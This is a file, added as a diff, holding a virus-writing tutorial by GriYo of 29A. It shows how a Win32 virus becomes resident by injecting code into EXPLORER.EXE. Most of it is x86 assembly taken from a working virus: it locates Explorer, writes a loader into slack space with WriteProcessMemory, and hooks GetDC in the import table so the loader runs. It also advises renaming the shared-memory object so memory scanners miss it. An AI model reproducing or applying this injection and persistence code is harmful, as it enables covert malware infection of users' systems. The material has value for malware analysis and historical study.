@@ -1,0 +1,898 @@
+	------------------------------
+	EXPLORER *in-memory* infection
+	by GriYo / 29A
+	------------------------------
+
+	------------
+	Introduction
+	------------
+
+To achieve that our virus remains residing in the system once finished the
+application that throw it is not an easy task in Win32. The memory that the
+virus has reserved will disappear together with the infected program. The
+same thing happens with per-process resident viruses: They will remain while
+the application that throw them this being executed.  
+  
+To achieve the total residence in Win32 we can appeal to several tricks:  
+  
+- We can add to the virus the capacity to drop its code to disk. The idea is
+  to create an executable that contains to the virus and to execute it.
+  
+- It is also interesting the possibility to register the virus like a 
+  service of the system, using RegisterServiceProcess on Win9x or accesing
+  the service control manager on WinNt/2000... But this also requires to 
+  write the virus to disk.  
+  
+- To give to the virus a driver structure is another possibility, but we 
+  would have to deal with the incompatibility of formats Win9x/NT/2000.
+
+- We could leave aside the compatibility with Win32 and to use some abrupt
+  residence method. In this case we could opt to jump at ring-0, to use 
+  VxDCall or any other technique.
+
+In this I article I will expose a residence technique: To infect 
+EXPLORER.EXE in memory and to stay resident on its address space. Although
+this technique is not new, I have not seen any virus that implements it under
+WinNt/2000, and neither I have found any article on it... so there we go!
+
+	--------
+	Strategy
+	--------
+
+To achieve our objective we will follow this steps:  
+  
+- The first thing will be to reserve memory for the virus. We will use
+  CreateFileMappingA and MapViewOfFile. This way the memory that we reserve
+  will be visible from another process (remember that the memory-mapped files
+  allows us to share memory among processes).  
+
+- The next thing will be to locate the process EXPLORER.EXE and to be able to
+  access it.
+
+- Once we have access to EXPLORER.EXE in memory we will look for a hole on
+  it. We will inject a small block of code block. The purpose of this code is
+  to make our memory-block visible from EXPLORER.EXE process.
+
+- For finish we will install a hook in an API used by EXPLORER.EXE, so that
+  when this API is called, the code that we have added receives the control.
+
+	----------------------
+	Allocate shared memory
+	----------------------
+
+By means of the use of memory-mapped files we can reserve a block of memory
+and then access it from another process. We will also take advantage of not
+well-known characteristic of the memory-mapped files: a memory-mapped file
+doesn't have to be linked to a file on disk. Look at this code:
+
+		lea eax,dword ptr [ebp+szObjectName]
+		push eax
+		push SIZEOF_MEMORYBLOCK
+		push 00000000h
+		push PAGE_READWRITE
+		push 00000000h
+		push 0FFFFFFFFh
+		call dword ptr [ebp+a_CreateFileMappingA]
+		or eax,eax
+		jz GoBack2Host
+
+		mov edi,eax
+
+		call dword ptr [ebp+a_GetLastError]		
+		cmp eax,000000B7h		    ; ERROR_ALREADY_EXISTS
+		je GoBack2Host
+
+The first parameter pushed into stack is the name we are going to give to
+our memory-mapped file object. Is a good idea to make this name change from
+one system to another, so the virus wont be detected in memory just by
+looking for a known memory-mapped object name.
+
+Next comes the size of the region of memory we want to allocate, followed
+by the high order dword (typically null).
+
+The access rights comes now, PAGE_READWRITE will allow us to read/write to
+our memory-block.
+
+The next parameter is ignored, so we use null for it.
+
+The trick comes with the last pushed parameter: The file handle to the file
+from which to create the mapping object. By specifying 0FFFFFFFFh as
+handle the function creates a file-mapping object of the specified size 
+backed by physical memory rather than by a named file in the file system. 
+This file-mapping object can be shared by name.
+
+On return we will get a null EAX register if the function call failed.
+
+If the object existed before the function call, the function returns a handle
+to the existing object (with its current size, not the specified size) and 
+GetLastError returns ERROR_ALREADY_EXISTS. This gives to us an extra
+feature: installation check at the same time we allocate memory.
+
+Its now time to get a view of this newly created filemapping:
+
+		push 00000000h
+		push 00000000h
+		push 00000000h
+		push FILE_MAP_WRITE
+		push edi
+		call dword ptr [ebp+a_MapViewOfFile]
+		or eax,eax
+		jz GoBack2Host
+
+The first three dwords are the number of bytes of the file to map 
+(specify zero to map the entire file) and the offset.
+
+Next comes the access rights. FILE_MAP_WRITE will give us Read/Write access.
+
+The last parameter (EDI) is a handle to the file-mapping object created by
+CreateFileMappingA.
+As result of the above code we obtain a pointer to a block of memory of
+the requested size.
+
+As last step, we write the virus to the allocated memory.
+
+	--------------------------------
+	Looking for EXPLORER.EXE process
+	--------------------------------
+
+The way we will follow depends on the operating system version, so lets
+start with something like this:
+
+		lea esi,dword ptr [ebp+system_version]
+		push esi
+		mov dword ptr [esi],00000094h
+		call dword ptr [ebp+a_GetVersionEx]
+		or eax,eax
+		jz GoBack2Host
+
+		add esi,00000010h		
+		cld
+		lodsb
+
+		cmp eax,VER_PLATFORM_WIN32_NT
+		je MemInfectWinNt
+
+		cmp eax,VER_PLATFORM_WIN32_WINDOWS
+		je MemInfectWin9x
+
+Now let see each part by separate...
+
+	----------------------------------
+	Find EXPLORER.EXE under Windows 9x
+	----------------------------------
+
+In windows9x we have a group of functions dedicated to enumerate the 
+processes, modules and threads present in the system. These are the
+TOOLHELP32 functions, that reside in the KERNEL32.DLL, and are available
+only under Win9x:
+
+		CreateToolhelp32Snapshot
+		Heap32First
+		Heap32ListFirst
+		Heap32ListNext
+		Heap32Next
+		Module32First
+		Module32Next
+		Process32First
+		Process32Next
+		Thread32First
+		Thread32Next
+		Toolhelp32ReadProcessMemory 
+
+We will concentrate on 5 of these functions: 
+
+- CreateToolhelp32Snapshot
+
+Allow us to take a snapshot of the system. The rest of the functions will
+allow us to access to the information taken in the snapshot.
+
+- Process32First and Process32Next
+
+Retrieves information about the processes encountered in a system snapshot.
+
+- Module32First and Module32Next
+
+Retrieves information about the modules associated with a process.
+
+Lets see this functions working:
+
+		push 00000000h
+                push TH32CS_SNAPPROCESS
+                call dword ptr [ebp+a_CreateToolhelp32Snapshot]
+                cmp eax,0FFFFFFFFh
+                je ExitMemWin9x
+
+                mov dword ptr [ebp+hSnapshot],eax
+
+The first parameter specifies the process identifier and will be ignored when
+taking a snapshot of running processes.
+
+The next parameter specifies portions of the system to include in the 
+snapshot. This parameter can be one of the following values:
+
+		TH32CS_INHERIT		Makes the returned handle 
+					inheritable
+
+		TH32CS_SNAPALL 		To get a complete snapshot of the 
+					whole system
+
+		TH32CS_SNAPHEAPLIST 	To include the heap list of the 
+					specified process in the snapshot
+
+		TH32CS_SNAPMODULE 	To list modules of the specified
+					process
+
+		TH32CS_SNAPPROCESS 	To list processes
+
+		TH32CS_SNAPTHREAD 	Includes the thread list
+
+Lets do a TH32CS_SNAPPROCESS snapshot and use Process32First and 
+Process32Next to search for EXPLORER.EXE
+
+                lea eax,dword ptr [ebp+ProcessEntry]
+                push eax
+                mov dword ptr [eax],SIZEOFPROCESSENTRY
+                push dword ptr [ebp+hSnapshot]
+                call dword ptr [ebp+a_Process32First]
+                or eax,eax
+                jz CloseSnapshot
+
+CheckProcEntry: ;
+		;Check here if it is EXPLORER.EXE
+		;
+
+                lea eax,dword ptr [ebp+ProcessEntry]
+                push eax                                ;lppe
+                push dword ptr [ebp+hSnapshot]          ;hSnapshot
+                call dword ptr [ebp+a_Process32Next]
+                or eax,eax
+                jnz CheckProcEntry
+
+Both Process32First and Process32Next use a structure called PROCESSENTRY32.
+This is our definition of a PROCESSENTRY32:
+
+ProcessEntry                    equ $
+
+ProcEdwSize                     dd 00000000h
+ProcEcntUsage                   dd 00000000h
+ProcEth32ProcessID              dd 00000000h
+ProcEth32DefaultHeapID          dd 00000000h
+ProcEth32ModuleID               dd 00000000h
+ProcEcntThreads                 dd 00000000h
+ProcEth32ParentProcessID        dd 00000000h
+ProcEpcPriClassBase             dd 00000000h
+ProcEdwFlags                    dd 00000000h
+ProcEszExeFile                  db MAX_PATH dup (00h)
+
+SIZEOFPROCESSENTRY              equ ($-ProcessEntry)
+
+Before calling this functions the member ProcEdwSize have to be loaded with
+the structure size. Otherwise the call fails.
+
+On return the structure is filled with the corresponding information. We can
+have a look at the ProcEszExeFile member: It contains the full path and
+filename of the process being examined. This will allow us to determine if
+this is EXPLORER.EXE (i remove the code to do this from the example, as it
+is not interesting for the purpose of this article).
+
+Once EXPLORER.EXE process have been located we close the snapshot and create
+a new one. This time we will request a snapshot of the modules corresponding
+to the process EXPLORER.EXE
+
+		push dword ptr [ebp+hSnapshot]
+                call dword ptr [ebp+a_CloseHandle]
+
+                push dword ptr [ebp+ProcEth32ProcessID]
+                push TH32CS_SNAPMODULE
+
+                call dword ptr [ebp+a_CreateToolhelp32Snapshot]
+                cmp eax,0FFFFFFFFh
+                je ExitMemWin9x
+
+                mov dword ptr [ebp+hSnapshot],eax
+
+To access to the information returned by this snapshot we will use 
+Module32First and Module32Next. One of the obtained modules will be 
+EXPLORER.EXE process by itself. These apis returns the information obtained
+in the following structure:
+
+ModuleEntry                     equ $
+
+ModEdwSize                      dd 00000000h
+ModEth32ModuleID                dd 00000000h
+ModEth32ProcessID               dd 00000000h
+ModEGlblcntUsage                dd 00000000h
+ModEProccntUsage                dd 00000000h
+ModEmodBaseAddr                 dd 00000000h
+ModEmodBaseSize                 dd 00000000h
+ModEhModule                     dd 00000000h
+ModEszModule                    db MAX_MODULE_NAME32+1 dup (00h) 
+ModEszExePath                   db MAX_PATH dup (00h)
+
+SIZEOFMODULEENTRY               equ ($-ModuleEntry)
+
+Lets see the above mentioned working:
+
+                lea edi,dword ptr [ebp+ModuleEntry]
+                push edi
+                mov dword ptr [edi],SIZEOFMODULEENTRY
+                push eax
+                call dword ptr [ebp+a_Module32First]
+                or eax,eax
+                jz CloseSnapshot
+
+CheckEMod:      mov eax,dword ptr [ebp+ProcEth32ModuleID]
+                cmp eax,dword ptr [ebp+ModEth32ModuleID]
+                je MODULE_FOUND
+                
+                push edi                                ;lpme
+                push dword ptr [ebp+hSnapshot]          ;hSnapshot
+                call dword ptr [ebp+a_Module32Next]
+                or eax,eax
+                jnz CheckEMod
+
+                jmp CloseSnapshot       ;Abort if module not found
+
+For each returned module we compare its ModEth32ModuleID member with the
+ProcEth32ModuleID member returned by the previous process snapshot.
+
+To obtain the module of the process EXPLORER.EXE has an important fact. It
+is the field ModEhModule that contains the module handle... And this, in 
+Win32, is equivalent to the base address where the module is loaded in
+memory.
+
+	---------------------------------------------------
+	Find EXPLORER.EXE under Windows NT and Windows 2000
+	---------------------------------------------------
+
+All the above-mentioned is not applicable to Windows NT where the functions
+of TOOLHELP32 don't exist. To be able to obtain a list of the processes and
+modules we will have to appeal an additional DLL: PSAPI.DLL
+
+This dll provides us the following functions:
+
+		EmptyWorkingSet 
+		EnumDeviceDrivers 
+		EnumProcesses 
+		EnumProcessModules 
+		GetDeviceDriverBaseName 
+		GetDeviceDriverFileName 
+		GetMappedFileName 
+		GetModuleBaseName 
+		GetModuleFileNameEx 
+		GetModuleInformation 
+		GetProcessMemoryInfo 
+		GetWsChanges 
+		InitializeProcessForWsWatch 
+		QueryWorkingSet
+
+...but to achieve our objective we will require only of the following ones:
+
+- EnumProcesses
+
+Will gives us an array filled with the process id's of each running process.
+
+- EnumProcessModules
+
+Will return to us an array filled with the module handle's of each module
+loaded by a specified process.
+
+Example:
+
+		lea edi,dword ptr [ebp+EP_Bytes]
+		push edi
+		push 00000080h
+		lea esi,dword ptr [ebp+ProcessIdList]
+		push esi
+		call dword ptr [ebp+a_EnumProcesses]
+		or eax,eax
+		jz ExitMemNt
+
+		mov ecx,dword ptr [edi]
+		shr ecx,02h
+		jecxz ExitMemNt
+
+The first parameter is a pointer to a variable that receives the number of
+bytes returned in the array.
+
+The second one is the size of the array. The function fails if the specified
+size arent enough to hold the complete list.
+
+The last parameter is a pointer to the array that recives the the list of
+process identifiers.
+
+To determine how many processes were enumerated by the call to EnumProcesses,
+divide the resulting value in the EP_Bytes parameter by 04h (size of
+a DWORD).
+
+Now lets try to open the each returned process:
+
+		push dword ptr [ebp+PROCESS_ID]
+		push 00000000h
+		push 	PROCESS_QUERY_INFORMATION or	\
+			PROCESS_VM_READ or		\
+			PROCESS_VM_WRITE or		\
+			PROCESS_VM_OPERATION
+
+		call dword ptr [ebp+a_OpenProcess]
+
+Most of the returned processes wont allow us to open them with the specified
+access rights. But thats not the case for EXPLORER.EXE
+
+Once opened, we have a handle to a process... We still have to see if its
+EXPLORER.EXE
+
+Now, we are going to retrieve the first module for this process:
+
+		lea edx,dword ptr [ebp+EP_Bytes]
+		push edx
+		push 00000080h
+		lea esi,dword ptr [ebp+ModuleList]
+		push esi
+		push eax
+
+		call dword ptr [ebp+a_EnumProcessModules]
+		or eax,eax
+		jz NCProcess
+
+		cld
+		lodsd
+
+		mov dword ptr [ebp+hModule],eax
+
+Note that there is no need to look for other modules: The first returned
+module is the one of EXPLORER.EXE by itself.
+
+Now we have the module handle (load address) of a process... Lets use
+the kernel32 function GetModuleBaseNameA to get the name of the module
+and check if its EXPLORER.EXE
+
+		push MAX_PATH
+		lea esi,dword ptr [ebp+BufStrFilename]
+		push esi
+		push dword ptr [ebp+hModule]
+		push dword ptr [ebp+hProcess]
+
+		call dword ptr [ebp+a_GetModuleBaseNameA]
+		or eax,eax
+		jz NCProcess
+
+	--------
+	Takeover
+	--------
+
+The following part is common for Win9x/Nt/2000
+
+Once we have located the base address (module handle) where EXPLORER.EXE 
+resides we can use the functions ReadProcessMemory and WriteProcessMemory on
+it.
+
+I wrote the following routines that do that:
+
+;Read process memory routine
+;
+;On entry:
+;		eax -> Pointer to the base address from which to read
+;		ecx -> Specifies the requested number of bytes to read
+;		esi -> Pointer to a buffer that receives the contents from 
+;		       the address address
+;
+;		[ebp+hProcess] contains the target process handle
+;
+;On exit:
+;		eax -> NULL if error
+;
+;		ebx, ecx, esi, edi, ebp preserved
+
+ReadProcessMem:	push edi
+		push ecx
+
+		lea edi,dword ptr [ebp+EP_Bytes]	;lpNumberOfBytesRead
+		push edi
+		push ecx				;nSize
+		push esi				;lpBuffer
+		push eax				;lpBaseAddress
+		push dword ptr [ebp+hProcess]		;hProcess
+
+		call dword ptr [ebp+a_ReadProcessMemory]
+
+		pop ecx
+
+		or eax,eax
+		jz ExitREM
+
+		cmp dword ptr [edi],ecx
+		je ExitREM
+
+		xor eax,eax
+
+ExitREM:	pop edi
+		cld
+		ret
+
+;Write process memory routine
+;
+;On entry:
+;		eax -> Pointer to the base address in the specified process
+;		       to which data will be written
+;		ecx -> Specifies the number of bytes to write
+;		esi -> Pointer to the buffer that contains data to be written
+;
+;		[ebp+hProcess] contains the target process handle
+;
+;On exit:
+;		eax -> NULL if error
+;
+;		ebx, ecx, esi, edi, ebp preserved
+
+WriteProcessMem:push edi
+		push ecx
+
+		lea edi,dword ptr [ebp+EP_Bytes]  ;lpNumberOfBytesWritten
+		push edi
+		push ecx				;nSize
+		push esi				;lpBuffer
+		push eax				;lpBaseAddress
+		push dword ptr [ebp+hProcess]		;hProcess
+
+		call dword ptr [ebp+a_WriteProcessMemory]
+
+		pop ecx
+
+		or eax,eax
+		jz ExitWEM
+
+		cmp dword ptr [edi],ecx
+		je ExitWEM
+
+		xor eax,eax
+
+ExitWEM:	pop edi
+		cld
+		ret
+
+By means of this routines we can Read/Write from/to EXPLORER.EXE memory
+image.
+
+Now we have the following:
+
+- A handle over EXPLORER.EXE process with write access
+- The base address where EXPLORER.EXE resides
+
+What we can do with this? The answer is simple: Inject our virus in the process
+of EXPLORER.EXE, so that it remains there when the infected application finishes.
+
+Step by step. To begin we locate the section table. Once there we search on it for
+a suitable section.
+
+		mov ebx,dword ptr [ebp+hModule]
+		mov ecx,00000004h
+		lea esi,dword ptr [ebp+Explorer_MZ_lfanew]
+		mov eax,ebx
+		add eax,MZ_lfanew
+		call ReadProcessMem
+		or eax,eax
+		jz FE_Exit
+	
+		lodsd		;There is a CLD at the end of ReadProcessMem
+		or eax,eax	;Now esi -> Explorer_FH_SizeOfOptionalHeader
+		jz FE_Exit
+
+		; eax -> MZ_lfanew
+
+		add eax,ebx
+		mov edi,eax
+		add eax,00000004h + FH_SizeOfOptionalHeader
+		dec ecx
+		dec ecx
+		call ReadProcessMem
+		or eax,eax
+		jz FE_Exit
+
+		lodsw		;Just to do 
+				;esi -> Explorer_FH_NumberOfSections
+		mov eax,edi		
+		add eax,00000004h + FH_NumberOfSections
+		call ReadProcessMem
+		or eax,eax
+		jz FE_Exit
+
+		lodsw		;esi -> Explorer_SectionHeader
+		movzx ecx,ax	;ecx -> Number of sections
+
+		movzx eax,word ptr [ebp+Explorer_FH_SizeOfOptionalHeader]
+		add edi,eax
+		add edi,00000004h + IMAGE_SIZEOF_FILE_HEADER
+
+
+We need a section in which we can read and write. A section that contains
+data already initialized. If the desired attributes are found, then we see
+if the section have some free space for us ( SH_SizeOfRawData > SH_VirtualSize ).
+				
+ExplorerHole:	push ecx
+
+		mov eax,edi
+		mov ecx,IMAGE_SIZEOF_SECTION_HEADER
+		call ReadProcessMem
+		or eax,eax
+		jz E_NextSection
+
+		;There is free space ?
+
+		cmp dword ptr [esi+SH_Characteristics],			\
+				   	IMAGE_SCN_MEM_READ or 		\
+					IMAGE_SCN_MEM_WRITE or		\
+					IMAGE_SCN_CNT_INITIALIZED_DATA
+		jne E_NextSection
+
+		mov eax,dword ptr [esi+SH_SizeOfRawData]
+		sub eax,dword ptr [esi+SH_VirtualSize]
+		js E_NextSection
+
+		cmp eax,SIZEOF_EVL
+		jae Ok_E_Section
+
+		;Try next section
+
+E_NextSection:	add edi,ecx
+		pop ecx
+		loop ExplorerHole
+
+		;No suitable section found
+
+		jmp FE_Exit
+
+once we have found a section to our measure, we write on it a block of code, we will
+talk close about this code later.
+
+Ok_E_Section:	pop ecx         ;Cleanup stack
+
+		;Setup some values in the code we want to write to EXPLORER.EXE
+
+		mov eax,dword ptr [ebp+a_GetDC]
+		mov dword ptr [ebp+EVL_a_OrginalApiAddr],eax
+
+		mov eax,dword ptr [ebp+a_OpenFileMappingA]
+		mov dword ptr [ebp+EVL_a_OpenFileMapping],eax
+		mov eax,dword ptr [ebp+a_MapViewOfFile]
+		mov dword ptr [ebp+EVL_a_MapViewOfFile],eax
+
+		mov eax,ebx
+		add eax,dword ptr [esi+SH_VirtualAddress]
+		add eax,dword ptr [esi+SH_VirtualSize]
+
+		mov dword ptr [ebp+Explorer_Patch],eax
+
+		mov ecx,SIZEOF_EVL
+		lea esi,dword ptr [ebp+EVL_code]
+		call WriteProcessMem
+		or eax,eax
+		jz FE_Exit
+
+Once we have written our loader into EXPLORER.EXE we prepare to put a hook in an api.
+This hook will pass control to this injected code.
+
+		;Go to EXPLORER.EXE data directory
+		
+		mov eax,ebx
+		add eax,dword ptr [ebp+Explorer_MZ_lfanew]
+		add eax,00000004h + 					\
+			IMAGE_SIZEOF_FILE_HEADER +			\
+			OH_DataDirectory.DE_Import.DD_VirtualAddress
+
+		mov ecx,00000004h
+		lea esi,dword ptr [ebp+Explorer_DE_Import]
+		call ReadProcessMem
+		or eax,eax
+		jz FE_Exit
+	
+		;Search for USER32 import module descriptor
+
+		lodsd
+		add eax,ebx
+		mov edi,eax
+		
+E_Search_K32:	mov eax,edi
+		mov ecx,IMAGE_SIZEOF_IMPORT_DESCRIPTOR
+		lea esi,dword ptr [ebp+Explorer_ImportDescriptor]
+		call ReadProcessMem
+		or eax,eax
+		jz FE_Exit
+
+		;Last import module descriptor!?
+
+		cmp dword ptr [esi],00000000h
+		je FE_Exit
+
+		;Check import module descriptor ID_Name
+		
+		mov eax,ebx
+		add eax,dword ptr [esi+ID_Name]
+		mov ecx,00000010h
+		lea esi,dword ptr [ebp+Explorer_ID_Name]
+		call ReadProcessMem
+		or eax,eax
+		jz FE_Exit
+
+		push edi
+
+		lea edi,dword ptr [ebp+BufStrFilename]
+		call parse_filename
+		mov esi,edx
+		call get_str_crc32
+
+		pop edi
+
+		cmp edx,dword ptr [ebp+CRCszUSER32]	;Is USER32.DLL ?
+		je E_Found_K32
+
+		;Next import module descriptor
+
+		add edi,IMAGE_SIZEOF_IMPORT_DESCRIPTOR
+		jmp E_Search_K32
+
+		;USER32.DLL import module descriptor found
+
+E_Found_K32:	mov edi,dword ptr [ebp+					\
+				   Explorer_ImportDescriptor+		\
+				   ID_FirstThunk]
+		add edi,ebx
+		mov ecx,00000004h
+		lea esi,dword ptr [ebp+Explorer_Hook]
+		
+E_NextThunk:	mov eax,edi
+		call ReadProcessMem
+		or eax,eax
+		jz FE_Exit
+
+		mov eax,dword ptr [esi]
+		or eax,eax
+		jz FE_Exit
+
+		cmp eax,dword ptr [ebp+a_GetDC]
+		je E_Poison
+
+		add edi,ecx
+		jmp E_NextThunk
+
+		;Gotcha!
+
+E_Poison:	mov eax,edi
+		mov dword ptr [ebp+Explorer_Init_Hook],eax
+		lea esi,dword ptr [ebp+Explorer_Patch]
+
+		call WriteProcessMem	; ECX already loaded
+		or eax,eax
+		jz FE_Exit
+
+		;Done!!!! ieieie!!!!
+		;Insert rest of code here
+
+
+		ret
+
+FE_Exit:	;Residency proc failed!
+
+
+		ret
+
+If you have not given yourself bill: this code belongs to a complete virus. 
+You will find some calls to routines that don't appear in this I article. The
+sample code is for orientation only.
+
+Lets continue. This is the code we have injected into some free space inside
+EXPLORER.EXE:
+
+;Code injected into EXPLORER.EXE
+;
+;The purpose of this code is to get access to virus memory from EXPLORER.EXE
+
+EVL_code	equ $
+
+		;Let some space for the return address... then save all regs
+
+		push eax
+		pushad
+
+		;This is the original address of the API... Lets make the
+		;return address point to it
+
+			db 0B8h		; EAX -> Original API address
+EVL_a_OrginalApiAddr	dd 00000000h
+
+		mov dword ptr [esp+cPushad],eax
+
+		;Attempt to avoid reentrance problems
+
+		call MultiThreadSafe
+
+		db 00h ;Only changed over hook code, not over main virus body
+
+MultiThreadSafe:pop esi
+		mov edi,esi
+		cld
+		lodsb
+		or al,al
+		jnz MayBeOnNextCall
+		dec al
+		stosb
+
+		;Try to open the virus file-mapping
+		;
+		;There is some kinda race condition here... If the infected
+		;program terminates before this point we wont be able to
+		;find the rest of the virus in memory...
+		;
+		;In that case the hook will stay present, and this code may 
+		;be able to find the virus memory-mapping on next attemps
+
+		call GetszObjName	;lpName 
+
+szObjectName	db 10h dup (00h)
+
+GetszObjName:	push 00000000h		;bInheritHandle 
+		mov edi,FILE_MAP_WRITE
+		push edi		;dwDesiredAccess
+
+			db 0B8h		; EAX -> OpenFileMappingA
+EVL_a_OpenFileMapping	dd 00000000h
+
+		call eax
+		or eax,eax
+		jz MayBeOnNextCall
+
+		;The file-mapping is here... Get an image of it
+
+		xor edx,edx
+		push edx
+		push edx
+		push edx
+		push edi
+		push eax
+
+			db 0B8h		; EAX -> OpenFileMappingA
+EVL_a_MapViewOfFile	dd 00000000h
+
+		call eax
+
+		or eax,eax
+		jz MayBeOnNextCall
+
+		;Great! We have access to virus allocated memory, but
+		;remember we are now inside EXPLORER.EXE !!!!
+		;
+		;Jump to virus complete image in order to complete
+		;initialization inside EXPLORER.EXE
+
+		add eax,offset ExplorerInit - offset viro_sys
+		call eax
+
+		;Restore regs and jump to original API code
+
+MayBeOnNextCall:popad
+		ret
+
+SIZEOF_EVL	equ $-EVL_code
+
+The api GetDC in EXPLORER.EXE have been redirected so that it points to this code.
+Once it receives the control, it looks for the block of shared memory 
+( the one we was talking about at the beginning of the article ). Once we obtain
+a handle on this memory we already made sure the permanency in the system until 
+EXPLORER.EXE finishes ( probably at the end of the session, if it doesn't give an 
+error and it finishes before ).
+
+Some of you may be wonder: Why the memory continues there after the infected
+application terminates?. The reason is simple: Because the memory is not 
+released by the system until all the handles that make reference to it has been
+closed. When the infected application terminates, it closes their handle to this 
+memory, but there is still one more open handle, property of EXPLORER.
+
+
+
+And with this concludes this article. I hope you have enjoyed.
+
+--
+GriYo / 29A
+
+I'm not in the business...
+...I am the business
